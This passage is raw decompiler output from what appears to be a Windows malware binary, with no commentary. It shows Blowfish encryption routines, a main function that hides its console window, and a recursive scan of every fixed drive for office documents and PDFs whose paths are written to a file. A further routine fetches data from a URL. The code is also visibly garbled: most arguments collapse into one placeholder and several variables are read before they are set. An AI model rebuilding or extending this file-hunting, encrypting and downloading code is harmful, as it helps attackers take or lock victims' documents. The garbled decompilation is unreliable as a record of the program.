    int32_t v83 = *(int32_t *)((4 * v80 & 1020) + v13); // 0x4062f9
    int32_t v84 = *(int32_t *)(v5 + 56); // 0x406302
    uint32_t v85 = (v81 + *(int32_t *)((v80 / 0x4000 & 1020) + v7) ^ v82) + v83 ^ v75 ^ v84; // 0x406305
    int32_t v86 = *(int32_t *)((v85 / 0x4000 & 1020) + v7); // 0x406312
    int32_t v87 = *(int32_t *)(4 * v85 / 0x1000000 + v9); // 0x40631e
    int32_t v88 = *(int32_t *)((4 * v85 & 1020) + v13); // 0x40633c
    int32_t v89 = *(int32_t *)(v5 + 60); // 0x406345
    uint32_t v90 = (v87 + v86 ^ *(int32_t *)((v85 / 64 & 1020) + v11)) + v88 ^ v80 ^ v89; // 0x406348
    int32_t v91 = *(int32_t *)((v90 / 0x4000 & 1020) + v7); // 0x406355
    int32_t v92 = *(int32_t *)(4 * v90 / 0x1000000 + v9); // 0x406361
    int32_t v93 = *(int32_t *)((v90 / 64 & 1020) + v11); // 0x406370
    uint32_t v94 = *(int32_t *)(v5 + 68) ^ v90; // 0x406379
    int32_t v95; // 0x405f10
    *(char *)(v95 + 3) = (char)v94;
    int32_t v96 = *(int32_t *)(v5 + 64); // 0x40638c
    *(char *)v95 = (char)(v94 / 0x1000000);
    uint32_t v97 = *(int32_t *)((4 * v90 & 1020) + v13) + (v92 + v91 ^ v93) ^ v85 ^ v96; // 0x40639b
    *(char *)(v95 + 1) = (char)(v94 / 0x10000);
    *(char *)(v95 + 2) = (char)(v94 / 256);
    *(char *)(v95 + 4) = (char)(v97 / 0x1000000);
    uint32_t result = v97 / 0x10000; // 0x4063b2
    *(char *)(v95 + 5) = (char)result;
    *(char *)(v95 + 6) = (char)(v97 / 256);
    *(char *)(v95 + 7) = (char)v97;
    return result;
}

// Address range: 0x4063d0 - 0x406887
int32_t function_4063d0(int32_t a1) {
    unsigned char v1 = *(char *)a1; // 0x4063d8
    unsigned char v2 = *(char *)(a1 + 1); // 0x4063db
    unsigned char v3 = *(char *)(a1 + 2); // 0x4063e4
    unsigned char v4 = *(char *)(a1 + 3); // 0x4063ed
    int32_t v5; // 0x4063d0
    int32_t v6 = *(int32_t *)(v5 + 68); // 0x4063f6
    uint32_t v7 = (256 * (256 * (256 * (int32_t)v1 | (int32_t)v2) | (int32_t)v3) | (int32_t)v4) ^ v6; // 0x4063f6
    int32_t v8 = v5 + 1096; // 0x406404
    int32_t v9 = *(int32_t *)((v7 / 0x4000 & 1020) + v8); // 0x406404
    int32_t v10 = v5 + 72; // 0x406410
    int32_t v11 = *(int32_t *)(4 * v7 / 0x1000000 + v10); // 0x406410
    int32_t v12 = v5 + 2120; // 0x40641f
    int32_t v13 = *(int32_t *)((v7 / 64 & 1020) + v12); // 0x40641f
    int32_t v14 = v5 + 3144; // 0x40642e
    int32_t v15 = *(int32_t *)((4 * v7 & 1020) + v14); // 0x40642e
    unsigned char v16 = *(char *)(a1 + 4); // 0x406435
    unsigned char v17 = *(char *)(a1 + 5); // 0x406439
    unsigned char v18 = *(char *)(a1 + 6); // 0x406445
    unsigned char v19 = *(char *)(a1 + 7); // 0x406451
    int32_t v20 = *(int32_t *)(v5 + 64); // 0x40645a
    uint32_t v21 = v20 ^ (v11 + v9 ^ v13) + v15 ^ (256 * (256 * (256 * (int32_t)v16 | (int32_t)v17) | (int32_t)v18) | (int32_t)v19); // 0x40645f
    int32_t v22 = *(int32_t *)(4 * v21 / 0x1000000 + v10); // 0x406478
    int32_t v23 = *(int32_t *)((v21 / 64 & 1020) + v12); // 0x406487
    int32_t v24 = *(int32_t *)((4 * v21 & 1020) + v14); // 0x406496
    int32_t v25 = *(int32_t *)(v5 + 60); // 0x40649d
    uint32_t v26 = (v22 + *(int32_t *)((v21 / 0x4000 & 1020) + v8) ^ v23) + v24 ^ v7 ^ v25; // 0x4064a2
    int32_t v27 = *(int32_t *)(4 * v26 / 0x1000000 + v10); // 0x4064bb
    int32_t v28 = *(int32_t *)((v26 / 64 & 1020) + v12); // 0x4064ca
    int32_t v29 = *(int32_t *)((4 * v26 & 1020) + v14); // 0x4064d9
    int32_t v30 = *(int32_t *)(v5 + 56); // 0x4064e0
    uint32_t v31 = (v27 + *(int32_t *)((v26 / 0x4000 & 1020) + v8) ^ v28) + v29 ^ v21 ^ v30; // 0x4064e5
    int32_t v32 = *(int32_t *)(4 * v31 / 0x1000000 + v10); // 0x4064fe
    int32_t v33 = *(int32_t *)((v31 / 64 & 1020) + v12); // 0x40650d
    int32_t v34 = *(int32_t *)((4 * v31 & 1020) + v14); // 0x40651c
    int32_t v35 = *(int32_t *)(v5 + 52); // 0x406523
    uint32_t v36 = (v32 + *(int32_t *)((v31 / 0x4000 & 1020) + v8) ^ v33) + v34 ^ v26 ^ v35; // 0x406528
    int32_t v37 = *(int32_t *)(4 * v36 / 0x1000000 + v10); // 0x406541
    int32_t v38 = *(int32_t *)((v36 / 64 & 1020) + v12); // 0x406550
    int32_t v39 = *(int32_t *)((4 * v36 & 1020) + v14); // 0x40655f
    int32_t v40 = *(int32_t *)(v5 + 48); // 0x406568
    uint32_t v41 = (v37 + *(int32_t *)((v36 / 0x4000 & 1020) + v8) ^ v38) + v39 ^ v31 ^ v40; // 0x40656b
    int32_t v42 = *(int32_t *)(4 * v41 / 0x1000000 + v10); // 0x406584
    int32_t v43 = *(int32_t *)((v41 / 64 & 1020) + v12); // 0x406593
    int32_t v44 = *(int32_t *)((4 * v41 & 1020) + v14); // 0x4065a2
    int32_t v45 = *(int32_t *)(v5 + 44); // 0x4065ab
    uint32_t v46 = (v42 + *(int32_t *)((v41 / 0x4000 & 1020) + v8) ^ v43) + v44 ^ v36 ^ v45; // 0x4065ae
    int32_t v47 = *(int32_t *)(4 * v46 / 0x1000000 + v10); // 0x4065c7
    int32_t v48 = *(int32_t *)((v46 / 64 & 1020) + v12); // 0x4065d6
    int32_t v49 = *(int32_t *)((4 * v46 & 1020) + v14); // 0x4065e5
    int32_t v50 = *(int32_t *)(v5 + 40); // 0x4065ee
    uint32_t v51 = (v47 + *(int32_t *)((v46 / 0x4000 & 1020) + v8) ^ v48) + v49 ^ v41 ^ v50; // 0x4065f1
    int32_t v52 = *(int32_t *)(4 * v51 / 0x1000000 + v10); // 0x40660a
    int32_t v53 = *(int32_t *)((v51 / 64 & 1020) + v12); // 0x406619
    int32_t v54 = *(int32_t *)((4 * v51 & 1020) + v14); // 0x406628
    int32_t v55 = *(int32_t *)(v5 + 36); // 0x406631
    uint32_t v56 = (v52 + *(int32_t *)((v51 / 0x4000 & 1020) + v8) ^ v53) + v54 ^ v46 ^ v55; // 0x406634
    int32_t v57 = *(int32_t *)(4 * v56 / 0x1000000 + v10); // 0x40664d
    int32_t v58 = *(int32_t *)((v56 / 64 & 1020) + v12); // 0x40665c
    int32_t v59 = *(int32_t *)((4 * v56 & 1020) + v14); // 0x40666b
    int32_t v60 = *(int32_t *)(v5 + 32); // 0x406674
    uint32_t v61 = (v57 + *(int32_t *)((v56 / 0x4000 & 1020) + v8) ^ v58) + v59 ^ v51 ^ v60; // 0x406677
    int32_t v62 = *(int32_t *)(4 * v61 / 0x1000000 + v10); // 0x406690
    int32_t v63 = *(int32_t *)((v61 / 64 & 1020) + v12); // 0x40669f
    int32_t v64 = *(int32_t *)((4 * v61 & 1020) + v14); // 0x4066ae
    int32_t v65 = *(int32_t *)(v5 + 28); // 0x4066b7
    uint32_t v66 = (v62 + *(int32_t *)((v61 / 0x4000 & 1020) + v8) ^ v63) + v64 ^ v56 ^ v65; // 0x4066ba
    int32_t v67 = *(int32_t *)(4 * v66 / 0x1000000 + v10); // 0x4066d3
    int32_t v68 = *(int32_t *)((v66 / 64 & 1020) + v12); // 0x4066e2
    int32_t v69 = *(int32_t *)((4 * v66 & 1020) + v14); // 0x4066f1
    int32_t v70 = *(int32_t *)(v5 + 24); // 0x4066fa
    uint32_t v71 = (v67 + *(int32_t *)((v66 / 0x4000 & 1020) + v8) ^ v68) + v69 ^ v61 ^ v70; // 0x4066fd
    int32_t v72 = *(int32_t *)(4 * v71 / 0x1000000 + v10); // 0x406716
    int32_t v73 = *(int32_t *)((v71 / 64 & 1020) + v12); // 0x406725
    int32_t v74 = *(int32_t *)((4 * v71 & 1020) + v14); // 0x406734
    int32_t v75 = *(int32_t *)(v5 + 20); // 0x40673d
    uint32_t v76 = (v72 + *(int32_t *)((v71 / 0x4000 & 1020) + v8) ^ v73) + v74 ^ v66 ^ v75; // 0x406740
    int32_t v77 = *(int32_t *)(4 * v76 / 0x1000000 + v10); // 0x406759
    int32_t v78 = *(int32_t *)((v76 / 64 & 1020) + v12); // 0x406768
    int32_t v79 = *(int32_t *)((4 * v76 & 1020) + v14); // 0x406777
    int32_t v80 = *(int32_t *)(v5 + 16); // 0x406780
    uint32_t v81 = (v77 + *(int32_t *)((v76 / 0x4000 & 1020) + v8) ^ v78) + v79 ^ v71 ^ v80; // 0x406783
    int32_t v82 = *(int32_t *)(4 * v81 / 0x1000000 + v10); // 0x40679c
    int32_t v83 = *(int32_t *)((v81 / 64 & 1020) + v12); // 0x4067ab
    int32_t v84 = *(int32_t *)((4 * v81 & 1020) + v14); // 0x4067ba
    int32_t v85 = *(int32_t *)(v5 + 12); // 0x4067c3
    uint32_t v86 = (v82 + *(int32_t *)((v81 / 0x4000 & 1020) + v8) ^ v83) + v84 ^ v76 ^ v85; // 0x4067c6
    int32_t v87 = *(int32_t *)((v86 / 0x4000 & 1020) + v8); // 0x4067d3
    int32_t v88 = *(int32_t *)(4 * v86 / 0x1000000 + v10); // 0x4067df
    int32_t v89 = *(int32_t *)((v86 / 64 & 1020) + v12); // 0x4067ee
    int32_t v90 = *(int32_t *)(v5 + 8); // 0x406806
    uint32_t v91 = (v88 + v87 ^ v89) + *(int32_t *)((4 * v86 & 1020) + v14) ^ v81 ^ v90; // 0x406809
    int32_t v92 = *(int32_t *)((v91 / 0x4000 & 1020) + v8); // 0x406816
    int32_t v93 = *(int32_t *)(4 * v91 / 0x1000000 + v10); // 0x406822
    int32_t v94 = *(int32_t *)((v91 / 64 & 1020) + v12); // 0x406831
    uint32_t v95 = v91 ^ v5; // 0x40683a
    int32_t v96 = *(int32_t *)((4 * v91 & 1020) + v14); // 0x406842
    int32_t v97; // 0x4063d0
    *(char *)(v97 + 3) = (char)v95;
    *(char *)v97 = (char)(v95 / 0x1000000);
    uint32_t v98 = (v93 + v92 ^ v94) + v96 ^ v86 ^ *(int32_t *)(v5 + 4); // 0x40685b
    *(char *)(v97 + 1) = (char)(v95 / 0x10000);
    *(char *)(v97 + 2) = (char)(v95 / 256);
    *(char *)(v97 + 4) = (char)(v98 / 0x1000000);
    uint32_t result = v98 / 0x10000; // 0x406872
    *(char *)(v97 + 5) = (char)result;
    *(char *)(v97 + 6) = (char)(v98 / 256);
    *(char *)(v97 + 7) = (char)v98;
    return result;
}

// Address range: 0x406890 - 0x406b5c
// Used cryptographic patterns:
//  - Blowfish_bfp_table (32-bit, little endian)
int32_t function_406890(int32_t * a1) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = 0; // bp-20, 0x4068c4
    __asm_rep_movsd_memcpy((char *)a1, (char *)&Blowfish_bfp_table_at_4192b0, 18);
    _memcpy(&g14, &g14, (int32_t)&g14);
    int32_t v3 = 3; // 0x4068e0
    int32_t v4 = v1 + 8; // 0x4068e0
    int32_t v5 = 2; // 0x4068e0
    int32_t v6 = v5 - 2; // 0x4068e7
    int32_t v7 = v5 - 1; // 0x4068f7
    int32_t v8; // 0x406890
    unsigned char v9 = *(char *)(v8 + (int32_t)((0x100000000 * (int64_t)(v6 >> 31) | (int64_t)v6) % 24)); // 0x4068fa
    unsigned char v10 = *(char *)(v8 + (int32_t)((0x100000000 * (int64_t)(v7 >> 31) | (int64_t)v7) % 24)); // 0x406906
    unsigned char v11 = *(char *)(v8 + 2); // 0x406912
    unsigned char v12 = *(char *)(v8 + 3); // 0x406924
    int32_t * v13 = (int32_t *)(v4 - 8); // 0x40692a
    int32_t v14 = *v13; // 0x40692a
    *v13 = (256 * (256 * (256 * (int32_t)v9 | (int32_t)v10) | (int32_t)v11) | (int32_t)v12) ^ v14;
    unsigned char v15 = *(char *)(v8 + 4); // 0x406938
    unsigned char v16 = *(char *)(v8 + 5); // 0x406942
    unsigned char v17 = *(char *)(v8 + 6); // 0x406954
    unsigned char v18 = *(char *)(v8 + 7); // 0x406960
    int32_t * v19 = (int32_t *)(v4 - 4); // 0x406969
    int32_t v20 = *v19; // 0x406969
    *v19 = (256 * (256 * (256 * (int32_t)v15 | (int32_t)v16) | (int32_t)v17) | (int32_t)v18) ^ v20;
    unsigned char v21 = *(char *)(v8 + 8); // 0x406977
    unsigned char v22 = *(char *)(v8 + 9); // 0x406984
    unsigned char v23 = *(char *)(v8 + 10); // 0x406990
    unsigned char v24 = *(char *)(v8 + 11); // 0x4069a2
    int32_t * v25 = (int32_t *)v4; // 0x4069a8
    int32_t v26 = *v25; // 0x4069a8
    *v25 = (256 * (256 * (256 * (int32_t)v21 | (int32_t)v22) | (int32_t)v23) | (int32_t)v24) ^ v26;
    unsigned char v27 = *(char *)(v8 + 12); // 0x4069b2
    unsigned char v28 = *(char *)(v8 + 13); // 0x4069bf
    unsigned char v29 = *(char *)(v8 + 14); // 0x4069d1
    unsigned char v30 = *(char *)(v8 + 15); // 0x4069dd
    int32_t * v31 = (int32_t *)(v4 + 4); // 0x4069e6
    int32_t v32 = *v31; // 0x4069e6
    *v31 = (256 * (256 * (256 * (int32_t)v27 | (int32_t)v28) | (int32_t)v29) | (int32_t)v30) ^ v32;
    unsigned char v33 = *(char *)(v8 + 16); // 0x4069f4
    unsigned char v34 = *(char *)(v8 + 17); // 0x406a01
    unsigned char v35 = *(char *)(v8 + 18); // 0x406a0d
    unsigned char v36 = *(char *)(v8 + 19); // 0x406a1f
    int32_t * v37 = (int32_t *)(v4 + 8); // 0x406a25
    int32_t v38 = *v37; // 0x406a25
    *v37 = (256 * (256 * (256 * (int32_t)v33 | (int32_t)v34) | (int32_t)v35) | (int32_t)v36) ^ v38;
    unsigned char v39 = *(char *)(v8 + 20); // 0x406a33
    unsigned char v40 = *(char *)(v8 + 21); // 0x406a3d
    unsigned char v41 = *(char *)(v8 + 22); // 0x406a51
    unsigned char v42 = *(char *)(v8 + 23); // 0x406a5d
    int32_t * v43 = (int32_t *)(v4 + 12); // 0x406a66
    int32_t v44 = *v43; // 0x406a66
    *v43 = (256 * (256 * (256 * (int32_t)v39 | (int32_t)v40) | (int32_t)v41) | (int32_t)v42) ^ v44;
    v3--;
    v4 += 24;
    v5 += 24;
    while (v3 != 0) {
        // 0x4068e7
        v6 = v5 - 2;
        v7 = v5 - 1;
        v9 = *(char *)(v8 + (int32_t)((0x100000000 * (int64_t)(v6 >> 31) | (int64_t)v6) % 24));
        v10 = *(char *)(v8 + (int32_t)((0x100000000 * (int64_t)(v7 >> 31) | (int64_t)v7) % 24));
        v11 = *(char *)(v8 + 2);
        v12 = *(char *)(v8 + 3);
        v13 = (int32_t *)(v4 - 8);
        v14 = *v13;
        *v13 = (256 * (256 * (256 * (int32_t)v9 | (int32_t)v10) | (int32_t)v11) | (int32_t)v12) ^ v14;
        v15 = *(char *)(v8 + 4);
        v16 = *(char *)(v8 + 5);
        v17 = *(char *)(v8 + 6);
        v18 = *(char *)(v8 + 7);
        v19 = (int32_t *)(v4 - 4);
        v20 = *v19;
        *v19 = (256 * (256 * (256 * (int32_t)v15 | (int32_t)v16) | (int32_t)v17) | (int32_t)v18) ^ v20;
        v21 = *(char *)(v8 + 8);
        v22 = *(char *)(v8 + 9);
        v23 = *(char *)(v8 + 10);
        v24 = *(char *)(v8 + 11);
        v25 = (int32_t *)v4;
        v26 = *v25;
        *v25 = (256 * (256 * (256 * (int32_t)v21 | (int32_t)v22) | (int32_t)v23) | (int32_t)v24) ^ v26;
        v27 = *(char *)(v8 + 12);
        v28 = *(char *)(v8 + 13);
        v29 = *(char *)(v8 + 14);
        v30 = *(char *)(v8 + 15);
        v31 = (int32_t *)(v4 + 4);
        v32 = *v31;
        *v31 = (256 * (256 * (256 * (int32_t)v27 | (int32_t)v28) | (int32_t)v29) | (int32_t)v30) ^ v32;
        v33 = *(char *)(v8 + 16);
        v34 = *(char *)(v8 + 17);
        v35 = *(char *)(v8 + 18);
        v36 = *(char *)(v8 + 19);
        v37 = (int32_t *)(v4 + 8);
        v38 = *v37;
        *v37 = (256 * (256 * (256 * (int32_t)v33 | (int32_t)v34) | (int32_t)v35) | (int32_t)v36) ^ v38;
        v39 = *(char *)(v8 + 20);
        v40 = *(char *)(v8 + 21);
        v41 = *(char *)(v8 + 22);
        v42 = *(char *)(v8 + 23);
        v43 = (int32_t *)(v4 + 12);
        v44 = *v43;
        *v43 = (256 * (256 * (256 * (int32_t)v39 | (int32_t)v40) | (int32_t)v41) | (int32_t)v42) ^ v44;
        v3--;
        v4 += 24;
        v5 += 24;
    }
    // 0x406a77
    int32_t v45; // bp-32, 0x406890
    int32_t * v46 = (int32_t *)((int32_t)&v45 - 4);
    int32_t v47 = &v2;
    unsigned char v48; // 0x406890
    int32_t v49 = v48;
    unsigned char v50; // 0x406890
    int32_t v51 = v50;
    unsigned char v52; // 0x406890
    unsigned char v53; // 0x406890
    int32_t result = 256 * (0x10000 * (int32_t)v53 | (int32_t)v52);
    for (int32_t i = 0; i < 18; i += 2) {
        // 0x406a80
        *v46 = v47;
        function_405f10((int32_t)&g14);
        int32_t v54 = 4 * i + v1;
        *(int32_t *)v54 = 256 * (0x10000 * v2 | v49) | v51;
        *(int32_t *)(v54 + 4) = result;
    }
    int32_t v55 = v1 + 76; // 0x406aec
    for (int32_t i = 4; i > 0; i--) {
        for (int32_t j = 128; j > 0; j--) {
            // 0x406af5
            *v46 = v47;
            function_405f10((int32_t)&g14);
            *(int32_t *)(v55 - 4) = 256 * (0x10000 * v2 | v49) | v51;
            *(int32_t *)v55 = result;
            v55 += 8;
        }
    }
    // 0x406b55
    return result;
}

// Address range: 0x406b60 - 0x406b77
int main(int argc, char ** argv) {
    // 0x406b60
    ShowWindow(GetConsoleWindow(), (int32_t)&g14);
    function_40aa50();
    return 0;
}

// Address range: 0x408e60 - 0x4090e3
int32_t function_408e60(int32_t lpOut) {
    // 0x408e60
    __chkstk();
    wsprintfW((int16_t *)lpOut, (int16_t *)&g14);
    int32_t lpFileName; // bp-4112, 0x408e60
    int16_t * v1 = (int16_t *)&lpFileName; // bp-24, 0x408ea8
    char lpFindFileData; // bp-8800, 0x408e60
    int32_t * v2 = FindFirstFileW((int16_t *)&lpFileName, (struct _WIN32_FIND_DATAW *)&lpFindFileData); // 0x408ea9
    if (v2 == (int32_t *)-1) {
        // 0x408eba
        return _40___security_check_cookie_40_4();
    }
    // 0x408ecd
    int32_t v3; // bp-4, 0x408e60
    int32_t v4 = &v3; // 0x408e61
    int32_t v5 = (int32_t)v2; // 0x408ea9
    int32_t v6; // bp-8756, 0x408e60
    int32_t v7 = &v6; // 0x408eeb
    int32_t v8 = &lpFileName;
    int32_t v9 = v4 - 0x2238;
    int32_t v10; // bp-8208, 0x408e60
    int32_t v11 = &v10;
    int32_t v12 = (int32_t)&v1; // 0x408ed9
    int32_t v13; // 0x408e60
    int32_t v14; // 0x408e60
    while (true) {
      lab_0x408ee0:;
        int32_t v15 = v12;
        *(int32_t *)(v15 - 4) = (int32_t)&g2;
        int32_t v16 = v15 - 8; // 0x408eeb
        *(int32_t *)v16 = v7;
        int32_t v17 = lstrcmpW((int16_t *)&g14, (int16_t *)&g14); // 0x408eec
        v14 = v16;
        if (v17 == 0) {
            goto lab_0x4090a7;
        } else {
            // 0x408ef6
            *(int32_t *)(v15 - 12) = (int32_t)L"..";
            int32_t v18 = v15 - 16; // 0x408f01
            *(int32_t *)v18 = v7;
            int32_t v19 = lstrcmpW((int16_t *)&g14, (int16_t *)&g14); // 0x408f02
            v14 = v18;
            if (v19 == 0) {
                goto lab_0x4090a7;
            } else {
                int32_t * v20 = (int32_t *)(v15 - 20); // 0x408f18
                *v20 = v7;
                int32_t * v21 = (int32_t *)(v15 - 24); // 0x408f19
                *v21 = lpOut;
                int32_t v22 = v15 - 28; // 0x408f20
                int32_t * v23 = (int32_t *)v22; // 0x408f20
                *v23 = (int32_t)L"%s\\%s";
                int32_t * v24 = (int32_t *)(v15 - 32); // 0x408f25
                *v24 = v8;
                wsprintfW((int16_t *)&g14, (int16_t *)&g14);
                if ((lpFindFileData & 16) == 0) {
                    // 0x408f48
                    *v20 = (int32_t)L".txt";
                    *v21 = v7;
                    *v23 = 2 * lstrlenW((int16_t *)&g14) + v9;
                    int32_t v25 = lstrcmpW((int16_t *)&g14, (int16_t *)&g14); // 0x408f5e
                    v13 = v22;
                    if (v25 == 0) {
                        goto lab_0x409054;
                    } else {
                        // 0x408f68
                        *v24 = (int32_t)L".doc";
                        *(int32_t *)(v15 - 36) = v7;
                        int32_t v26 = lstrlenW((int16_t *)&g14); // 0x408f74
                        int32_t v27 = v15 - 40; // 0x408f7d
                        *(int32_t *)v27 = 2 * v26 + v9;
                        int32_t v28 = lstrcmpW((int16_t *)&g14, (int16_t *)&g14); // 0x408f7e
                        v13 = v27;
                        if (v28 == 0) {
                            goto lab_0x409054;
                        } else {
                            // 0x408f88
                            *(int32_t *)(v15 - 44) = (int32_t)L".xls";
                            *(int32_t *)(v15 - 48) = v7;
                            int32_t v29 = lstrlenW((int16_t *)&g14); // 0x408f94
                            int32_t v30 = v15 - 52; // 0x408f9d
                            *(int32_t *)v30 = 2 * v29 + v9;
                            int32_t v31 = lstrcmpW((int16_t *)&g14, (int16_t *)&g14); // 0x408f9e
                            v13 = v30;
                            if (v31 == 0) {
                                goto lab_0x409054;
                            } else {
                                // 0x408fa8
                                *(int32_t *)(v15 - 56) = (int32_t)L".xlsx";
                                *(int32_t *)(v15 - 60) = v7;
                                int32_t v32 = lstrlenW((int16_t *)&g14); // 0x408fb4
                                int32_t v33 = v15 - 64; // 0x408fbd
                                *(int32_t *)v33 = 2 * v32 + v9;
                                int32_t v34 = lstrcmpW((int16_t *)&g14, (int16_t *)&g14); // 0x408fbe
                                v13 = v33;
                                if (v34 == 0) {
                                    goto lab_0x409054;
                                } else {
                                    // 0x408fc8
                                    *(int32_t *)(v15 - 68) = (int32_t)L".docx";
                                    *(int32_t *)(v15 - 72) = v7;
                                    int32_t v35 = lstrlenW((int16_t *)&g14); // 0x408fd4
                                    int32_t v36 = v15 - 76; // 0x408fdd
                                    *(int32_t *)v36 = v4 - 0x223a + 2 * v35;
                                    int32_t v37 = lstrcmpW((int16_t *)&g14, (int16_t *)&g14); // 0x408fde
                                    v13 = v36;
                                    if (v37 == 0) {
                                        goto lab_0x409054;
                                    } else {
                                        // 0x408fe4
                                        *(int32_t *)(v15 - 80) = (int32_t)L".xls";
                                        *(int32_t *)(v15 - 84) = v7;
                                        int32_t v38 = lstrlenW((int16_t *)&g14); // 0x408ff0
                                        int32_t v39 = v15 - 88; // 0x408ff9
                                        *(int32_t *)v39 = 2 * v38 + v9;
                                        int32_t v40 = lstrcmpW((int16_t *)&g14, (int16_t *)&g14); // 0x408ffa
                                        v13 = v39;
                                        if (v40 == 0) {
                                            goto lab_0x409054;
                                        } else {
                                            // 0x409000
                                            *(int32_t *)(v15 - 92) = (int32_t)L".ppt";
                                            *(int32_t *)(v15 - 96) = v7;
                                            int32_t v41 = lstrlenW((int16_t *)&g14); // 0x40900c
                                            int32_t v42 = v15 - 100; // 0x409015
                                            *(int32_t *)v42 = 2 * v41 + v9;
                                            int32_t v43 = lstrcmpW((int16_t *)&g14, (int16_t *)&g14); // 0x409016
                                            v13 = v42;
                                            if (v43 == 0) {
                                                goto lab_0x409054;
                                            } else {
                                                // 0x40901c
                                                *(int32_t *)(v15 - 104) = (int32_t)L".pptx";
                                                *(int32_t *)(v15 - 108) = v7;
                                                int32_t v44 = lstrlenW((int16_t *)&g14); // 0x409028
                                                int32_t v45 = v15 - 112; // 0x409031
                                                *(int32_t *)v45 = 2 * v44 + v9;
                                                int32_t v46 = lstrcmpW((int16_t *)&g14, (int16_t *)&g14); // 0x409032
                                                v13 = v45;
                                                if (v46 == 0) {
                                                    goto lab_0x409054;
                                                } else {
                                                    // 0x409038
                                                    *(int32_t *)(v15 - 116) = (int32_t)L".pdf";
                                                    *(int32_t *)(v15 - 120) = v7;
                                                    int32_t v47 = lstrlenW((int16_t *)&g14); // 0x409044
                                                    int32_t v48 = v15 - 124; // 0x40904d
                                                    *(int32_t *)v48 = 2 * v47 + v9;
                                                    int32_t v49 = lstrcmpW((int16_t *)&g14, (int16_t *)&g14); // 0x40904e
                                                    v13 = v48;
                                                    v14 = v48;
                                                    if (v49 != 0) {
                                                        goto lab_0x4090a7;
                                                    } else {
                                                        goto lab_0x409054;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } else {
                    // 0x408f34
                    *v20 = v8;
                    function_408e60((int32_t)&g14);
                    v14 = v18;
                    goto lab_0x4090a7;
                }
            }
        }
    }
  lab_0x4090c3:;
    // 0x4090c3
    int32_t v50; // 0x408e60
    *(int32_t *)(v50 - 12) = v5;
    FindClose(&g14);
    return _40___security_check_cookie_40_4();
  lab_0x4090a7:
    // 0x4090a7
    v50 = v14;
    *(int32_t *)(v50 - 4) = (int32_t)&lpFindFileData;
    v12 = v50 - 8;
    *(int32_t *)v12 = v5;
    if (!FindNextFileW(&g14, (struct _WIN32_FIND_DATAW *)&g14)) {
        // break -> 0x4090c3
        goto lab_0x4090c3;
    }
    goto lab_0x408ee0;
  lab_0x409054:;
    int32_t * v51 = (int32_t *)(v13 - 4); // 0x40905a
    *v51 = v7;
    int32_t * v52 = (int32_t *)(v13 - 8); // 0x40905b
    *v52 = (int32_t)"%s\n";
    _printf((char *)&g14);
    int32_t * v53 = (int32_t *)(v13 - 12); // 0x40906b
    *v53 = v8;
    int32_t * v54 = (int32_t *)(v13 - 16); // 0x409072
    *v54 = (int32_t)L" \n%s \r\n";
    int32_t * v55 = (int32_t *)(v13 - 20); // 0x409077
    *v55 = v11;
    wsprintfW((int16_t *)&g14, (int16_t *)&g14);
    *v51 = v11;
    int32_t v56 = lstrlenW((int16_t *)&g14); // 0x409084
    *v52 = 0;
    int32_t v57; // bp-8812, 0x408e60
    *v53 = (int32_t)&v57;
    *v54 = 2 * v56;
    *v55 = v11;
    int32_t v58 = v13 - 24; // 0x4090a0
    *(int32_t *)v58 = g10;
    WriteFile(&g14, &g14, (int32_t)&g14, &g14, (struct _OVERLAPPED *)&g14);
    v14 = v58;
    goto lab_0x4090a7;
}

// Address range: 0x4090f0 - 0x409163
int32_t function_4090f0(void) {
    int32_t v1 = 260; // bp-556, 0x40910c
    int16_t lpBuffer; // bp-540, 0x4090f0
    GetLogicalDriveStringsW(260, &lpBuffer);
    if (lpBuffer == 0) {
        // 0x409153
        return _40___security_check_cookie_40_4();
    }
    int32_t v2 = &lpBuffer;
    int32_t v3 = &v1;
    int32_t v4 = v3 - 4; // 0x409130
    *(int32_t *)v4 = v2;
    if (GetDriveTypeW((int16_t *)&g14) == 3) {
        // 0x409138
        *(int32_t *)(v3 - 8) = v2;
        function_408e60((int32_t)&g14);
    }
    int32_t v5 = v2;
    int32_t v6 = v5 + 2; // 0x409141
    while (*(int16_t *)v6 != 0) {
        // 0x409141
        v5 = v6;
        v6 = v5 + 2;
    }
    int32_t v7 = v5 + 4; // 0x40914a
    while (*(int16_t *)v7 != 0) {
        // 0x409130
        v2 = v7;
        v3 = v4;
        v4 = v3 - 4;
        *(int32_t *)v4 = v2;
        if (GetDriveTypeW((int16_t *)&g14) == 3) {
            // 0x409138
            *(int32_t *)(v3 - 8) = v2;
            function_408e60((int32_t)&g14);
        }
        // 0x409141
        v5 = v2;
        v6 = v5 + 2;
        while (*(int16_t *)v6 != 0) {
            // 0x409141
            v5 = v6;
            v6 = v5 + 2;
        }
        // 0x40914a
        v7 = v5 + 4;
    }
    // 0x409153
    return _40___security_check_cookie_40_4();
}

// Address range: 0x4099c0 - 0x409b01
int32_t function_4099c0(int32_t * a1) {
    // 0x4099c0
    __chkstk();
    int16_t * v1 = NULL; // bp-10012, 0x4099f0
    int16_t * v2 = NULL; // bp-10020, 0x4099f6
    int32_t * v3 = InternetOpenW(NULL, (int32_t)a1, NULL, (int16_t *)&g14, (int32_t)&g14); // 0x4099fc
    if (v3 == NULL) {
        // 0x409a35
        return _40___security_check_cookie_40_4();
    }
    int32_t v4 = (int32_t)v3; // 0x4099fc
    int32_t v5 = v4; // bp-60, 0x409a1d
    int32_t * v6 = InternetOpenUrlW(v3, (int16_t *)&g14, (int16_t *)&g14, (int32_t)&g14, (int32_t)&g14, (int32_t)&g14); // 0x409a1e
    if (v6 == NULL) {
        // 0x409a2e
        InternetCloseHandle(v6);
        // 0x409a35
        return _40___security_check_cookie_40_4();
    }
    int32_t v7 = (int32_t)v6; // 0x409a1e
    int32_t v8; // bp-10008, 0x4099c0
    int32_t v9 = &v8; // 0x409a62
    int32_t v10 = 0; // 0x4099c0
    int32_t v11 = &v5;
    int32_t v12 = 0;
    *(int32_t *)(v11 - 4) = (int32_t)&v1;
    *(int32_t *)(v11 - 8) = 0x2710;
    *(int32_t *)(v11 - 12) = v9;
    *(int32_t *)(v11 - 16) = v7;
    InternetReadFile(&g14, &g14, (int32_t)&g14, &g14);
    int32_t * v13 = (int32_t *)(v11 - 20); // 0x409a72
    *v13 = v10 + (int32_t)v1;
    int32_t v14 = function_40bc21(); // 0x409a73
    int32_t * v15 = (int32_t *)(v11 - 24); // 0x409a78
    *v15 = v10;
    int32_t * v16 = (int32_t *)(v11 - 28); // 0x409a7b
    *v16 = v12;
